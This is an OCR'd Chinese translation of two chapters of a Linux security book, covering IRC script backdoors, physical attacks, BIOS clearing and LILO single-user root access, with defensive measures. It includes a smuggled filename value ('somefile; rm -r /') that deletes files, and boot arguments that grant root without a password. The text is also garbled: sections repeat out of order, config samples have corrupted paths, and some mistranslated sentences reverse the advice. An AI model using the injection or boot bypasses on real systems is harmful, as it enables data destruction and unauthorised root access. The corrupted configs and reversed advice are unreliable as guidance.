*注：Ramen 部分列表点的 OCR 文本高度碎片化/重复；在逻辑可行的情况下，我根据可用碎片保留了结构。*

## 第 4 章：社会工程、木马和其他黑客骗术

`Unix shell` 访问可以编写一种脚本，让黑客能够运行任意 shell 命令，例如删除你所有文件的命令，或通过电子邮件向黑客发送密码文件。

一些公开的脚本包含意料之外的后门。以下 IRC 脚本片段的目的是允许另一个 IRC 用户获取某个文件：

```
/ctcp % % DCC SEND % * exec -name stuff ls $5
```



然而，如果文件名是 `somefile; rm -r /`，那么它会提供 `somefile` 文件，并继续删除硬盘上的每一个文件，因为 `;` 是 shell 命令的分隔符。好吧，它不会删除所有文件，只会删除那些你有权限删除的文件，因为你恰肯定没有以 root 身份运行你的脚本，对吧？

许多公开的脚本内部都内置了后门，这些后门是是故之，而且往往显而易见。不要信任你找到的脚本，即使是朋友给你的，除非你足够精明，能够自己有效地审查代码。不要假设语言的简单就意味着它不可能被滥用。

脚本虽然很有诱惑力，但并不是在使用 IRC 时获得乐趣的必须。如果你想使用脚本，请学习该语言并自己编写脚本。

# 总结

本章中的示例并没有说明黑客欺骗人们破坏自身安全的唯一方法。新的方法不断地被尝试中。简而言之，保护自己免受协助黑客的最好方法是保持警惕、偏执、不信任并注重细节。

> 注意：-s/detail-oriented（注重细节）/anal-retentive（过度保守）/

## 第 5 章

## 物理攻击

有时人们在感到疲劳或寻找捷径时，会玩一些“愚蠢的计算机安全招数”。在便利贴上写下密码，并将机密、未粉碎的文件扔进垃圾桶，会增加攻击者对敏感数据大肆破坏的概率。能够物理访问设施、办公桌、计算机系统和网络组件的攻击者大大增加了他们的成功机会。

无论你让机器防范网络攻击的能力有多强，如果攻击者可以坐在你的办公室、你的电脑前，他就有更多的途径可以探索。有些是微妙的，例如从白板上汲取敏感信息；另一些则像大锤一样粗暴，例如拆除你的硬盘并带走。

在本章中，我们将关注攻击者如何利用物理访问，以网络无法实现的方式颠覆你的安全。

### 攻击办公室

对于许多人来说，办公室代表了他们花费周中大部分时间可能包括周末的地方。因此，办公室环境感觉就像是家之外的家。我们根据自己的喜好对其进行个性化处理，添加一两盆盆栽。我们可能会在墙上挂上配偶、伴侣和孩子的照片。换句话说，由于我们在办公室花费了这么多时间，我们会让那里变得尽可能舒适。

但在美学之外，我们还让那里感到尽可能安全。我们处于组织的安全周圈内。门上装有锁，我们甚至可能有武装人员确保只有员工或授权人员才能进入我们的设施。

然而，感到安全和舒适的危险在于，我们往往会放松警备，未能遵循良好的安全实践。。这为攻击者提供了获取组织内最敏感信息和系统所需的突破口。目标环境包括办公室，攻击者可以在那里找到写在纸条上的密码、未锁的日志本，甚至是白板上的内容。让我们回顾办公室的易受元素，例如工作区域、垃圾桶、控制台和笔记本电脑。

#### 工作场所

| 流行度: | 5 |
| --- | --- |
| 简单性: | 9 |
| 影响: | 7 |
| 风险评分: | 7 |

拥有时间且能访问用户工作区域的攻击者可以快速搜索机密信息，如密码、用户名、系统名、软盘

![](img/33829ffb1435b4baef56fcd2c28ec6cd_187_0.png)

## 第 5 章：物理攻击

CD-ROM、存档磁带、打印件等。这些物品经常出现在几个常见位置，包括：

- 贴在显示器上的便利贴，或悬空架子上，或墙壁和隔板上的便利贴
- 办公桌抽屉，可能在用品托盘或其他物体下方
- 笔记本
- 打印机和传真机旁的回收箱

除了密码或访问 ID 外，用户通常还会写下额外信息，如用户名或系统名。有了这些信息，攻击者就拥有了访问你系统所需的一切。即使有密码，关联用户名和系统可能也只需要很短的时间。想象一下如果攻击者发现一本写满用户名、系统名和密码的笔记本会发生什么。本笔记本将是一个金矿，让她能够访问你的大部分网络。

攻击者接下来可能会在工作区搜索打印件、软盘、CD-ROM、存档磁带、移动硬盘或任何其他类型的可记录介质。这些可能包含机密信息，如源代码、文档、电子邮件、数据库记录等。攻击者可能可以在不实际访问系统的情况下找到大部分信息。

攻击者可能寻找的额外有用信息：

- 电话列表：电话列表为攻击者提供了可能成为目标的人。更多信息请见第 6 章。
- 组织架构图：组织架构图识别了现场人员以外的联系人。
- 安全策略：安全策略列出了规则和程序。
- 备忘录：攻击者可以使用敏感备忘录寻找机密信息。
- 内部手册：许多公司拥有解释内部操作的私有手册。
- 日程：对于攻击者来说，日程可以识别攻击的最佳时间。
- 公司信纸和备忘录表格：攻击者可以使用这些文档发送看起来正式的信件和备忘录。

这可以攻击者对任何可能被利用的应用程序有良好的了解。

## Hacker Exposed：Linux 安全与解决方案

### 场所措施

整洁且锁好的工作场所是防御攻击者的最好方法。锁好手册、打印件和存储介质。记住，攻击者只需要定位一个密码就可以破坏你的网络。

首先，不要在白板、便利贴、笔记本或任何可能被攻击者查看的介质上写密码或访问 ID。如果可能，记住这些密码。如果你必须写下敏感信息，请将其放在加密文件中或具有良好密码的加密文件系统中。这样，在没有访问权限和密码的情况下，没有人可以查看。

此外，你可以使用 `GnuPG` 或其他 `PGP` 加密程序手动加密密码。`PGP`（Good Privacy）是由 Phil Zimmerman 编写的工具，非商业用途免费。`GnuPG`（GNU Privacy Guard）是一个较新的开发项目，对商业和非商业用途完全免费。源代码可用。使用这些工具之一加密单个文件。

> 注意 在某些操作系统上，你可能会发现名为“password safe”的工具。password safe 将密码信息存储在安全的加密容器中。遗憾的是，在本文编写期间，我们未能找到任何 Linux 版本的 password safe 工具。

### 垃圾翻找

| 流行度: | 9 |
| --- | --- |
| 简单性: | 9 |
| 影响: | 6 |
| 风险评分: | 8 |

垃圾翻找是地下社区喜爱的，它可以为攻击者提供丰富的信息。它的成功基于许多人根本并不理解他们扔进垃圾桶的东西。垃圾翻找通常在晚上进行，涉及搜索目标公司的垃圾，

### 第5章：物理攻击

……从而以极低的被发现风险获取信息。翻找垃圾桶（dumpster diving）最聪明的地方之一是，除非攻击者非法侵入，否则它通常被认为是合法的。

将敏感材料放在垃圾桶中的危险在于，翻找垃圾的人在圣诞节后在一家电子商店后面搜寻垃圾时，发现了一本包含手机购买信息的收据本。其中包含了购买者的姓名、地址和家庭电话号码。还包含了每部购买手机的唯一手机 ID，仅凭这些信息就可以用于盗打电话。

其他可能包含敏感信息的丢弃垃圾还包括信用卡收据、电话簿、日历、说明书、磁带、CD、软盘等。此外，攻击者还可能寻找被丢弃的硬件。已经有多个人在翻找垃圾时在设备上构建了自定义的网络配置。

#### 翻找垃圾的防御措施

首先，组织应该有一套定义良好的处理敏感信息的政策。该政策应包括如何标记、存储、传输和销毁敏感信息。此项政策中的信息应作为安全意识计划的一部分，供所有员工使用。

为了避免存储设备上的敏感信息被提取，请使用强磁铁完全擦除所有内容。

对于机密文件和手册，请将其粉碎。但请记住，这并不能完全销毁可读内容。一个例子是1980年美国驻伊朗大使馆被占领事件。大使馆粉碎了所有的机密文件以防止伊朗恐怖分子夺取。然而，伊朗攻击者获取了这些纸屑并进行分类，还穿透了部分文档，利用地毯编织工将它们编织在一起，使其再次变得可读。幸运的是，普通的攻击者没有时间、耐心或资源去进行这样的活动，因此一旦你的秘密被被粉碎，它们就应该是安全的。作为额外的预防，你可以使用横切碎纸机，它能同时从垂直和水平方向切割，从而将纸切成小方块而不是长条。

最后，垃圾桶应该放置在光线良好、安全的地点，最好由围栏围住并由锁的大门保护。

### 攻击网络秘密

| 流行度 | 5 |
| :--- | :--- |
| 简单性 | 6 |
| 影响 | 7 |
| 风险评分 | 6 |

访问网络设施允许攻击者获取有关系统和配置的信息。这是由于系统和网络管理员使用各种方法来跟踪他们的设备信息。一种常见的技术是在系统、监视器或网络设备上贴标签或便签。通常，这些标签会泄露系统名称、IP 地址、操作系统类型或其他机密信息。在路由器上，这些标签列出了子网信息。此外，在电话和网络电线上缠绕磁带，或者张贴显示网络和电话布线的建筑地图也并不常见。

这些方法过于清晰地识别了系统或网络设备及信息。进入设施的攻击者只需读取磁带就能学习大量关于网络如何运行和配置的信息。如果进入了网络机房，就可以识别出关键的网络网段。这可能允许入侵者在感兴趣的线上放置网络嗅探器或电话磁带。

#### 防止网络秘密被发现

防止敏感网络信息暴露的最安全方法是从系统、监视器、网络设备和电缆上移除所有标签。相反应该怎么办？嗯，可以将将其锁起来，或者放在安全的数据库中。然而，隐藏此类信息将使系统更难以识别和管理。如果你的数据库故障，你将面临严重的麻烦。

因此，防御措施是尽可能限制对设施和办公区域的访问。使用锁门和其他形式的访问控制保护更敏感的区域，如数据中心和布线室。此外，打印的网络地图或建筑地图不应放置在游客可以进入的开放区域。

### 滥用控制台访问

| 流行度 | 7 |
| :--- | :--- |
| 简单性 | 9 |
| 影响 | 10 |
| 风险评分 | 8 |

有一句古老的计算机安全谚言：“如果我对系统拥有物理访问，我就可以拥有这个系统。”这在今天是真实的，而且不仅适用于单用户 Windows 系统；Linux 和其他 UNIX 系统也是如此。

人们离开监视器而不无人是非常常见的。也许他们去去洗手间或去吃东西，或者可能他们已经下班回家了，电脑没关。这种无人看管的时间取决于原因，从几分钟到可能的几小时或几天不等。

他们是否配置了系统在一段时间后启动屏幕保护程序？如果是，它是否有密码保护？

如果这两个问题的答案都是“否”，那么他们就是让让自己的系统处于易受攻击或滥用的状态。任何人都可以坐下来装成用户。例如，他们可以给家人和朋友发送电子邮件。他们可以访问网络资源。他们甚至可以伪造电子签名。在短时间内可以进行大量活动，而且所有这些活动看起来都是合法的。

另一个严重的问题是在系统上安装木洛马或后门。许多预装的根内核工具（rootkits）中提供了了工具集和经过修改的系统命令。该名称暗示，根内核工具的目的是获取并持有 root 权限。一旦安装，它们就会提供后门，允许任何人以 root 身份访问系统，绕过正常的访问控制系统。有关根内核工具的更多信息，请参阅第 10 章。

可能还会安装网络嗅探器。这会将网卡设置为混杂模式，允许看到所有通过系统的网络流量（而不仅仅是针对该系统的流量）。网络嗅探器通常用于收集用户名和密码等数据。例如，用户 A 使用 telnet 登录系统。他们输入用户名和密码，获得了系统访问权限。然后执行一些活动并注销。这看起来很无害，但如果附近的系统上存在网络嗅探器，它可能会读取用户输入的一切。

我们将在第 6 章详细讨论网络嗅探器。

如果攻击者不愿意在系统上加载软件，可以在键盘电缆上安装小型硬件设备。该设备可能会捕获键盘击键，从而获取密码和用户 ID。稍后，攻击者可以回来取该设备。

这些只是从无人看管的监视器或控制台上进行的一些滥用示例。

#### 控制台防御措施

为了防止计算机在无人看管时受到攻击，请务必使用良好的屏幕保护程序。它应该遮挡屏幕而不扭曲实际屏幕内容。你不希望在屏幕保护程序运行时任何人看到机密信息。

更重要的是，确保屏幕保护程序可以使用密码保护并启用了该功能。有了它，在用户输入有效密码之前屏幕保护程序不会关闭。

为屏幕保护程序设置合理的等待时间。如果需要闲置一小时才能启动，系统可能会暴露很长时间。如果等待时间太短，可能会让用户感到困扰，他们可能会禁用它。

此外，鼓励所有用户在离开工作站时锁定系统。这将告诉屏幕保护程序立即运行，而不是等待闲置时间。如果可能，用户在离开时还应该注销系统。

### 笔记本电脑被盗

| 流行度 | 10 |
| :--- | :--- |
| 简单性 | 8 |
| 影响 | 10 |
| 风险等级 | 9 |

笔记本盗几乎可以发生在任何地方。如果攻击者拥有办公空间的物理访问权限，拿上笔记本走出门门是相对容易的。笔记本可能被放在公文包、健身包或背包中，甚至隐藏在大衣下面以通过安检。

> **注意：** 在讨论笔记本安全之前，必须强调重要的一点：如果你的笔记本被盗，小偷将不可避免地能够访问系统以及你的所有文件。你无法做任何事情来防止这一点。关于笔记本安全的另一点是，笔记本电脑可能成为办公室内外攻击的目标。

如果用户携带笔记本旅行，小偷可以在笔记本无人看管的任何时候下手。例如，一种常用的技巧是利用机场安检作为自己的便利。两名小偷会走过一个携带笔记本的人面前。第一名小偷会顺利通过安检。一旦目标将笔记本放在安检传送带上，第二名小偷就会触发报警，导致笔记本所有者在笔记本通过X光机时被延误。第一名小偷只需拿起笔记本走开。

#### 笔记本电脑被盗的应对措施

首先，确保你定期备份你的数据。如果你丢失了笔记本且没有备份可以依靠，那么一切都结束了，你输掉了战斗。将你的备份放在安全的地方，始终远离笔记本；简单来说，同时丢失电脑和备份就违背了备份的意义。最好的方法是在安全位置至少存放一个备份。如果可能，将其锁在工作场所的文件柜中。如果可能，将第二个备份放在另一个地方，也许在家。

其次，使用 `PGP` 或 `GnuPG` 等工具对笔记本上的关键数据进行加密，正如本章前面讨论过的。这些工具用于加密单个文件。如果你有大量想要保护的文件，你可能希望使用加密文件系统。我们将在下一节讨论加密文件系统。

许多人旅行时会携带笔记本电脑和 PDA（个人数据助手，如 Palm）。对于能够访问许多不同系统的个人来说，一种常见的做法是将密码、系统名称和网络信息存储在他们的 PDA 中。如果你是这些人中的一员，请避免将 PDA 与笔记本电脑放在一起。如果笔记本和 PDA 都被盗，小偷将找到访问笔记本所需的所有信息。可能更糟，他们可能会发现允许他们访问其他远程系统或你公司网络的信息。正如最近指出的，PDA 的典型安全性可能很弱。

在旅行期间，将笔记本随身携带至关重要。在将笔记本放在 X 光机之前，确保你通过了机场的金属探测器，并尽可能让笔记本在视范围内，这样如果有人拿起它，你可以识别出来。

办公场所的安全措施应要求任何离开设施的人打开公文包和其他包进行检查。此外，任何如笔记本电脑的设备都应该有属性标签以允许其离开设施。属性标签应注明型号、序列号以及允许移除设备的人员。

### 第5章：物理攻击

对 Linux 系统的物理访问权限为攻击者提供了控制该系统的最佳机会。对于 Linux 来说，这可能重启系统一样简单。

#### 双系统启动

| 流行度 | 3 |
| 简单 | 10 |
| 影响 | 5 |
| 风险等级 | 6 |

在包含一个或多个其他操作系统的系统上安装 Linux 是非常容易且常见的。通过使用 `LiLo` 等引导程序，用户可以选择启动哪种操作系统。这被称为双系统启动，它可以提供以下益处：

- **减少硬件需求**：通过在单一系统上放置多个操作系统，用户减少了所需的系统数量。
- **学习系统**：双系统启动允许对学习 Linux 感兴趣的人在其 Windows 系统的未闲分区上安装它。他们可以进行实验并学习 Linux 是如何工作的，同时仍然保留一个用于满足日常需求的完备 Windows 安装。

双系统启动虽然有用，但确实存在严重的安全问题。如果攻击者可以启动像 Windows 98 这样不安全的操作系统，所有保护 Linux 发行版的努力都可能付诸东流。尽管没有自定义工具，他将无法原生访问 Linux 分区，但他可以简单地擦除它们。这将完全破坏该系统上的 Linux，需要完全重新安装、配置和恢复备份来撤销这五分钟的滥用。

## 黑客攻防实录：Linux 安全秘密与解决方案

#### 双系统启动应对措施

避免在单一系统上运行一个以上的计算机，并使用独立的计算机来托管每个操作系统。如果这不可行，使用虚拟机架构允许将一个或多个目标系统托管在原生系统之上。你可以在 X Window 中运行 `VMware` 并启动 Windows 98，这可以满足你的出版的要求，即所有内容——即使是一本 Linux 安全书——都要用 Word 编写。虚拟机可能会获得你某些资源的访问，但仍然运行在 Linux进程内部，这意味着……

![](img/33829ffb1435b4baef56fcd2c28ec6cd_193_0.png)

## 启动权限即 root 权限

对 Linux 系统的物理访问权限为攻击者提供了控制该系统的最佳机会。对于 Linux 来说，这可能重启系统一样简单。

#### 双系统启动

| 流行度 | 3 |
| 简单 | 10 |
| 影响 | 5 |
| 风险等级 | 6 |

在包含一个或多个其他操作系统的系统上安装 Linux 是非常容易且常见的。通过使用 `LiLo` 等引导程序，用户可以选择启动哪种操作系统。这被称为双系统启动，它可以提供以下益处：

- **减少硬件需求**：通过在单一系统上放置多个操作系统，用户减少了所需的系统数量。
- **学习系统**：双系统启动允许对学习 Linux 感兴趣的人在其 Windows 系统的未闲分区上安装它。他们可以进行实验并学习 Linux 是如何工作的，同时仍然保留一个用于满足日常需求的完备 Windows 安装。

双系统启动虽然有用，但确实存在严重的安全问题。如果攻击者可以启动像 Windows 98 这样不安全的操作系统，所有保护 Linux 发行版的努力都可能付诸东流。尽管没有自定义工具，他将无法原生访问 Linux 分区，但他可以简单地擦除它们。这将完全破坏该系统上的 Linux，需要完全重新安装、配置和恢复备份来撤销这五分钟的滥用。

## 黑客攻防实录：Linux 安全秘密与解决方案

双系统启动应对措施

避免在单一系统上运行一个以上的计算机，并使用独立的计算机来托管每个操作系统。如果这不可行，使用虚拟机架构允许将一个或多个目标系统托管在原生系统之上。你可以在 X Window 中运行 `VMware` 并启动 Windows 98，这可以满足你的出版的要求，即所有内容——即使是一本 Linux 安全书——都要用 Word 编写。虚拟机可能会获得你某些资源的访问，但仍然运行在 Linux进程内部，这意味着……

![](img/33829ffb1435b4baef56fcd2c28ec6cd_193_0.png)

### 第5章：物理攻击

远程系统或你公司网络。正如最近指出的，PDA 的典型安全性可能很弱。

在旅行期间，将笔记本随身携带至关重要。在将笔记本放在 X 光机之前，确保你通过了机场的金属探测器，并尽可能让笔记本在视范围内，这样如果有人拿起它，你可以识别出来。

办公场所的安全措施应要求任何离开设施的人打开公文包和其他包进行检查。此外，任何如笔记本电脑的设备都应该有属性标签以允许其离开设施。属性标签应注明型号、序列号以及允许移除设备的人员。

## 启动权限即 root 权限

对 Linux 系统的物理访问权限为攻击者提供了控制该系统的最佳机会。对于 Linux 来说，这可能重启系统一样简单。

#### 双系统启动

| 流行度 | 3 |
| 简单 | 10 |
| 影响 | 5 |
| 风险等级 | 6 |

在包含一个或多个其他操作系统的系统上安装 Linux 是非常容易且常见的。通过使用 `LiLo` 等引导程序，用户可以选择启动哪种操作系统。这被称为双系统启动，它可以提供以下益处：

- **减少硬件需求**：通过在单一系统上放置多个操作系统，用户减少了所需的系统数量。
- **学习系统**：双系统启动允许对学习 Linux 感兴趣的人在其 Windows 系统的未闲分区上安装它。他们可以进行实验并学习 Linux 是如何工作的，同时仍然保留一个用于满足日常需求的完备 Windows 安装。

# 166 破解 Linux 暴露：Linux 安全秘密与解决方案

有很多工具会尝试破解并修改 BIOS 设置、获取 BIOS 密码，或简单清除 BIOS C-MOS 存储器，以删除所有可能发生的更改。这些工具几乎都是基于 DOS 的，并可以从软盘运行。如果你正确配置了 BIOS 和 `LILO` 设置以防止从可移动介质启动，那么你将免受此类工具的侵害。

攻击 BIOS 的另一种方法是物理清除 BIOS C-MOS 存储器。这被称为“刷 BIOS（flashing the BIOS）”。有三种方法。方法都需要对系统进行物理访问，因为必须拆机箱。

- 第一种技术是找到并使用专为此设计的特殊跳线（jumper）。该跳线被设计为一种辅助工具，在设置时会清除 BIOS 内存。这对于那些忘记密码、继承了带有未知密码的系统或遇到 BIOS 相关操作问题的人来说非常有用。

- 如果攻击者发现并找到了该跳线，他们只需移动它以建立连接，重置系统，然后恢复跳线的原始位置。此时，BIOS 默认设置（包括空密码）将恢复重置。

- 第二种方法是直接移除主板上的小锂电池。此电池为 BIOS 用于配置数据的 C-MOS 内存供电，使其具有易失性。如果你关闭系统，内存仍将保留数据（例如 BIOS 设置）。移除电池并切断系统电源后，内存将被清除。

- 最后一种方法是电短路 C-MOS 存储器的两个或多个引脚。此操作必须在系统关闭时进行。可以使用电线、弯曲的回形针或任何导电物体完成。使用的引脚取决于 C-MOS 芯片，你可以通过良好的搜索引擎在互联网上找到这些信息。

## 保护 BIOS

最好的 BIOS 保护是将关键系统放在安全的房间里。进入该房间应通过锁匙、卡钥匙或生物识别认证。该房间内还可能包含摄像头以监控活动。虽然这是最佳解决方案，但对每个人来说可能可行。

另一个选项是使用机箱锁。这些锁安装在计算机机箱上，防止在没有钥匙的情况下打开。除了撬锁之外，攻击者只剩下切开机箱或偷走它的选择。在这两种情况下，篡改痕迹都会非常明显。

第三点建议是从系统中完全移除软盘驱动器和 CD-ROM 驱动器。这将完全消除这一类滥用。

## 第 5 章：物理攻击

最后，可以使用摄像头监控工作区域内部及周围的活动。虽然这可能无法防止他人破坏你的系统，但如果你认为系统已被入侵，它至少可以提供证据。

## LILO 滥用

| 流行度 | 7 |
| :--- | :--- |
| 简单性 | 7 |
| 影响范围 | 9 |
| 风险评分 | 8 |

直接启动到单用户模式的能力引发了一个严重问题。在默认的 Linux 安装中，单用户模式通常会赋予你 root shell 权限，而无需输入有效的用户名和密码。这意味着任何人只需重启并在 `LILO` 提示符中指定 Linux 和单用户模式作为参数，即可获得系统的访问权限。这一切可以在几分钟内完成。

在安装 Linux 系统的过程中，引导程序很可能被写入引导记录中。引导程序是一段旨在启动特定操作系统（通常是 Linux）的小段代码。当系统重置、上电或重启时，引导程序是 BIOS 启动完成后第一个执行的代码。随后，引导程序将启动默认操作系统或用户指定的操作系统。

Linux 最常用的引导程序被称为 `LILO`，是 Linux Loader 的缩写。默认情况下，新的 Linux 安装会配置 `LILO` 在显示器上写入提示符，并等待用户输入短时间。如果延迟结束时没有用户输入，它将启动默认操作系统。默认系统可能是 Linux 或任何其他操作系统（如 Windows）。

此默认设置最初由安装程序创建并写入文件（通常为 `/etc/lilo.conf`）。该文件将包含 `LILO` 需要知道的所有可能选项。其他选项（包括额外操作系统的规范）可以添加到此文件中。仅修改此文件不会改变 `LILO` 的行为方式。你需要使用 `lilo` 命令将此配置信息写入硬盘上的引导记录中。

例如，随每个发行版而异的 `LILO` 提示符可能显示如下所示：

```
LILO Boot:
```

在提示符处，你可以指定要启动哪个操作系统；这对于能够启动多个操作系统的系统非常有用，例如 Linux/Windows 98 双系统系统。你只需输入 `linux` 或 `dos`，或者等待 `LILO` 延迟结束，在这种情况下，默认操作系统（在此例中为 Linux）将启动。输入回车将直接启动默认系统，跳过延迟时间。可以在 `lilo.conf` 文件中添加额外的运行定义。

# 破解 Linux 暴露：Linux 安全秘密与解决方案

在 `LILO` 提示符处，你也可以指定操作系统选项。例如，如果你想让 Linux 以单用户模式启动，你可以输入：

```
LILO Boot: linux 1
```

或者

```
LILO Boot: linux s
```

这将告诉 Linux 进入单用户模式，在该状态下很少进程处于激活状态。网络连接被禁用。**注意** 有关运行级别（runlevels）更多信息，请检查 `/etcab` 文件，它定义了系统在每个运行级别下的行为。对于 Linux 以及大多数发行版，哪些服务处于激活状态取决于系统的运行级别。详细描述请参附录 B。

要指示系统在进入单用户模式时运行 `sulogin` 命令，请添加以下条目：



# 进入单用户模式时运行 sulogin 命令

`su:s:wait=/bin/sulogin`

系统将等待输入 root 密码后生成 shell。

虽然此步骤可以防止任何人重启系统到单用户模式并获得 root 权限，但它并没有解决其他启动问题。`LILO` 本身在操作系统启动之前提供了一个可行的解决方案。另一种方案是在仅给出启动参数时才要求有效密码。

首先，查看一个 `lilo.conf` 文件示例：

```
boot=/dev/had
map=/boot/map
install=/boot/boot.b
vga=normal
default=linux
keytable=/boot/us.klt
lba32
prompt
timeout=50
message=/boot/message
image=/boot/mlinuz
label=linux
root=/dev/hda5
read-only
other=/dev/fd0
label=floppy
unsafe
```

在此示例中，我们将编辑 `lilo.conf` 文件，在启动默认操作系统“Linux”之前要求密码。使用你喜欢的编辑器向 `/etc/lilo.conf` 文件的 Linux 部分添加以下内容：

```
password=password-string
```

新条目显示所示：

```
boot=/dev/had
map=/boot/map
install=/boot/boot.b
```

## 破解 Linux 暴露：Linux 安全秘籍与解决方案

```
vga=normal
default=linux
key=/boot/us.klt
lba32
prompt
timeout=50
message=/boot/message
image=/boot/vmlinuz
label=linux
root=/dev/hda5
read-only
password=password-string
other=/dev/fd0
label=floppy
unsafe
```

现在，当系统启动时，Linux 将需要密码。如果延迟时间到期且 `LILO` 选择了默认项（即 Linux），情况也是如此。你可以为每个操作系统选项设置密码。

但是，如果只有在给 `LILO` 传递启动参数时才需要密码，那不是很好吗？是的，这可以通过使用 `lilo.conf` 文件中的 `restricted` 关键字来实现。这将指示 `LILO` 仅在提供参数时才需要密码，如下所示：

```
boot=/dev/had
map=/boot/map
install=/boot/boot.b
vga=normal
default=linux
key=/boot/us.klt
lba32
prompt
timeout=50
message=/boot/message
image=/boot/vmlinuz
label=linux
root=/dev/hda5
read-only
restricted
password=password-string
other=/dev/fd0
label=floppy
unsafe
```

## 第 5 章：物理攻击

只有在给 Linux 传递参数时才需要密码。否则，系统不会提示你提供密码。如果系统重启且 `LILO` 延迟到期，它将无人值启动默认系统。由于没有提供参数，因此不需要密码。

你也可以通过 `/etc/lilo.conf` 文件将密码和 `restricted` `LILO` 选项全局应用于所有操作系统。通过将这些条目移动到顶部的全局区域来实现，如下所示：

```
boot=/dev/had
map=/boot/map
install=/boot/boot.b
vga=normal
default=linux
keytable=/boot/us.klt
lba32
prompt
timeout=50
message=/boot/message
restricted
password=password-string
image=/boot/mlinuz
label=linux
root=/dev/hda5
read-only
other=/dev/fd0
label=floppy
unsafe
```

这将对所有 `LILO` 选择使用相同的密码。如果你希望为每个选择设置不同的密码，则需要在每个 OS 规范部分中添加密码。

该文件中仍然存在一个严重的漏洞。`floppy` 部分旨在从软盘启动镜像，以防你需要恢复损坏的操作系统或使用另一个基于软盘的环境（如 DOS）。如果你在 BIOS 中禁用了从软盘启动，那么这非常有用。问题在于，除非你在 `LILO` 启动提示符处为 `floppy` 选择添加任何参数，否则不需要密码。攻击者可以拿一张软盘，向其写入 Linux 镜像，插入系统并重启。当显示 `LILO` 启动提示符时，他们只需输入 `floppy`，软盘上的镜像就会启动。在软盘上的首次启动可能是写入软盘引导扇区的不同 `LILO` 版本。

该版本的 `LILO` 将不包含你的任何限制。攻击者随后可以输入：

```
LILO Boot: Linux 1
```

## 破解 Linux 暴露：Linux 安全秘籍与解决方案

随后 `LILO` 将在你的系统上启动 Linux 进入单用户模式。或者，如果你修改了 `/etc/inittab` 以在进入单用户模式时运行 `/sbin/sulogin`，他们可能还会获得另一个参数如 `init=/bin/bash`。

解决此问题的可能方法是将 `restricted` 指令移动到 Linux 选择规范部分，如下所示：

```
boot=/dev/hda
map=/boot/map
install=/boot/boot.b
vga=normal
default=linux
keytable=/boot/us.klt
lba32
prompt
timeout=50
message=/boot/message
password=password-string
image=/boot/mlin
label=linux
root=/dev/hda5
read-only
restricted
other=/dev/floppy
label=floppy
safe
```

这将允许默认 Linux 在不需要密码的情况下启动。然而，从软盘启动时将始终需要密码。对于希望为每个选择设置不同密码的人，你需要为每个规范准备单独的条目。

可以指定的另一个 `LILO` 指令是 `delay=`。它允许你以十分之一秒为单位指定在启动默认项之前等待用户输入的时间。你可以将其设置为 0 以禁用任何用户输入。问题在于，由于某种原因，你需要启动备用内核、软盘或操作系统时，将被阻止这样做。

> 有关 `/etc/lilo.conf` 内容以及如何更改 `LILO` 行为的更多信息，请参阅 `lilo` 和 `lilo.conf` 的在线手册页。

最后，保护 `/etc/lilo.conf` 文件。如果它是可读的，任何用户都能查看你设置的密码。这些密码没有加密，并且以明文形式显示。首先，让 `/etc/lilo.conf` 文件仅对 root 可见。输入以下命令更改 `lilo.conf` 文件的读写权限：

```
# chmod 600 /etc/lilo.conf
```

## 第 5 章：物理攻击

作为最后的预防措施，使用 `chattr` 为文件设置不可变标志：

```
# chattr +i /etc/lilo.conf
```

这将防止对文件进行修改。要移除标志，请使用：

```
# chattr -i /etc/lilo.conf
```



只有在给 Linux 传递参数时才需要密码。否则，系统不会提示你提供密码。如果系统重启且 LILO 延迟到期，它将无人值启动默认系统。由于没有提供参数，因此不需要密码。

你也可以通过 `/etc/lilo.conf` 文件将密码和 `restricted` LILO 选项全局应用于所有操作系统。通过将这些条目移动到顶部的全局区域来实现，如下所示：

### 加密文件系统

| 名称 | 描述 | 链接 | 备注 |
| :--- | :--- | :--- | :--- |
| CFS | 用于加密整个树 | [http://www.cryptography.org](http://www.cryptography.org) | 流行的实现 |
| TCFS | CFS 的延续 | [http://tfs.de](http://tfs.de) | 需要内核补丁 |
| BestCrypt | 允许创建文件 | [http://www.jetico.com](http://www.jetico.com) | 商业产品 |
| PPDD | Linux 设备驱动程序 | [http://linux01.gwd.de/~atham](http://linux01.gwd.de/~atham) | 无特殊工具 |
| EHD | 补丁登录 | [http://members.home.net/id-est/ehd.html](http://members.home.net/id-est/ehd.html) | Alpha 版本代码 |
| SteGFS | 加密硬盘上的数据 | [http://www.mcdonald.org.uk](http://www.mcdonald.org.uk) | 数据难以定位 |

这些系统的优点是它们可以保护你的数据。缺点是你完成后必须忘记卸载。

# 总结

物理安全领域充满危险。如果你没有采取必要的措施，访问者或攻击者可能会制造混乱或分散。最佳解决方案是限制对系统的物理访问。如果该方案不可，请将访问限制在合理范围内，并使用本章讨论的技术。

- 不要在他人可以看到的地方写下密码或访问 ID。
- 不要将电话列表、组织结构图、备忘录、内部手册、会议日程或内部安全策略放在可见处。
- 在丢弃打印文档、电子介质或客户数据时要小心。将敏感材料标记为“敏感”。在处理之前，粉碎敏感纸张和手册，擦除电子介质，并在光线良好且受保护的区域定位所有垃圾桶。

## 第 5 章：物理攻击

- 在标记网络组件时要加小心。将这些信息记录在良好的网络拓扑图中，并妥善上锁。
- 使用良好的带密码保护的屏幕保护程序，当其处于激活状态时隐藏屏幕内容。将延迟时间设置为合理范围——即在合理时间内会激活。
当你必须离开系统时，请锁定屏幕。
- 使用笔记本电脑时，尽一切做到随时随身携带。警惕小偷可能用来将你与电脑分离的技巧。此外，对进入你设施的每台笔记本电脑进行标记，并要求安全人员在离开时检查这些标记。
- 避免双启动操作系统。Linux 的安全性不会高于系统上安装的最弱运行环境。
- 对引导加载程序进行密码保护，以防止可能导致 root 访问的未经授权的重启。
- 对 BIOS 进行密码保护以防止篡改。
- 将所有敏感系统放置在锁好的门后，以防篡改。
- 使用良好的加密文件系统可以帮助防止已访问系统的人查看机密数据。这应该被作为最后一道防线。

# 第 6 章

![](img/33829ffb1435b4baef56fcd2c28ec6cd_208_0.png)

计算机在连接到网络时最有用。遗憾的是，网络让计算机暴露在多种类型的未经授权访问面前。系统对这类活动绝非完全免疫。

# 使用网络

在我们开始讨论实际攻击之前，让我们先讨论一些基本网络协议和概念的细节。计算机所在的网络将直接影响攻击它的手段。Linux 系统主要存在两种网络：TCP/IP 数据包交换网络和公共电话网络。

# TCP/IP 网络

